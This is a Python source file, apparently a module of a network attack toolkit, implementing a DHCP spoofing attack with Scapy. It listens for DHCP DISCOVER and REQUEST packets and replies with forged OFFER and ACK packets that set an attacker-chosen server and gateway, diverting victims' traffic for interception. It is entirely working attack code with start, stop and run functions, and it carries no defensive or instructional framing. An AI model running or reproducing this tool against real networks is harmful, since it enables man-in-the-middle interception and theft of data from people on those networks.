from scapy.all import *
import threading
import time
import logging
from utils import print_status
import config

class DHCPSpoofer:
    def __init__(self, spoofed_ip, spoofed_gw, interface=config.INTERFACE):
        self.spoofed_ip = spoofed_ip
        self.spoofed_gw = spoofed_gw
        self.interface = interface
        self.running = False
        self.thread = None
        self.attacker_mac = get_if_hwaddr(interface)

    def start(self):
        """Start DHCP spoofing attack."""
        if self.running:
            print_status("Attack already running", "warning")
            return False

        self.running = True
        self.thread = threading.Thread(target=self._spoof)
        self.thread.daemon = True
        self.thread.start()
        print_status(f"Started DHCP spoofing attack with IP {self.spoofed_ip}", "success")
        return True

    def stop(self):
        """Stop DHCP spoofing attack."""
        if not self.running:
            return False

        self.running = False
        if self.thread:
            self.thread.join()
        print_status("Stopped DHCP spoofing attack", "success")

    def _create_dhcp_offer(self, pkt):
        """Create a DHCP offer packet."""
        ether = Ether(src=self.attacker_mac, dst=pkt[Ether].src)
        ip = IP(src=self.spoofed_ip, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(
            op=2,
            yiaddr=self.spoofed_ip,
            siaddr=self.spoofed_ip,
            chaddr=pkt[BOOTP].chaddr,
            xid=pkt[BOOTP].xid
        )
        dhcp = DHCP(options=[
            ("message-type", "offer"),
            ("server_id", self.spoofed_ip),
            ("router", self.spoofed_gw),
            ("lease_time", config.DHCP_LEASE_TIME),
            ("subnet_mask", "255.255.255.0"),
            "end"
        ])
        return ether / ip / udp / bootp / dhcp

    def _create_dhcp_ack(self, pkt):
        """Create a DHCP ACK packet."""
        ether = Ether(src=self.attacker_mac, dst=pkt[Ether].src)
        ip = IP(src=self.spoofed_ip, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(
            op=2,
            yiaddr=self.spoofed_ip,
            siaddr=self.spoofed_ip,
            chaddr=pkt[BOOTP].chaddr,
            xid=pkt[BOOTP].xid
        )
        dhcp = DHCP(options=[
            ("message-type", "ack"),
            ("server_id", self.spoofed_ip),
            ("router", self.spoofed_gw),
            ("lease_time", config.DHCP_LEASE_TIME),
            ("subnet_mask", "255.255.255.0"),
            "end"
        ])
        return ether / ip / udp / bootp / dhcp

    def _handle_dhcp(self, pkt):
        """Handle DHCP packets."""
        if not self.running:
            return

        try:
            if DHCP in pkt:
                dhcp_type = None
                for opt in pkt[DHCP].options:
                    if opt[0] == 'message-type':
                        dhcp_type = opt[1]
                        break

                if dhcp_type == 1:  # DHCP DISCOVER
                    offer = self._create_dhcp_offer(pkt)
                    sendp(offer, verbose=0, iface=self.interface)
                    print_status(f"Sent DHCP OFFER to {pkt[Ether].src}", "info")
                
                elif dhcp_type == 3:  # DHCP REQUEST
                    ack = self._create_dhcp_ack(pkt)
                    sendp(ack, verbose=0, iface=self.interface)
                    print_status(f"Sent DHCP ACK to {pkt[Ether].src}", "info")

        except Exception as e:
            print_status(f"Error handling DHCP packet: {e}", "error")
            logging.error(f"Error handling DHCP packet: {e}")

    def _spoof(self):
        """Main spoofing loop."""
        try:
            sniff(filter="udp and (port 67 or 68)", 
                  prn=self._handle_dhcp, 
                  store=0, 
                  iface=self.interface)
        except Exception as e:
            print_status(f"Error in DHCP spoofing: {e}", "error")
            logging.error(f"Error in DHCP spoofing: {e}")
            self.running = False

def run_attack(spoofed_ip, spoofed_gw):
    """Run DHCP spoofing attack with proper cleanup."""
    try:
        spoofer = DHCPSpoofer(spoofed_ip, spoofed_gw)
        spoofer.start()
        
        # Keep the main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print_status("\nStopping attack...", "warning")
            spoofer.stop()
            
    except Exception as e:
        print_status(f"Error: {e}", "error")
        logging.error(f"Error in DHCP spoofing attack: {e}")
        return False
    
    return True 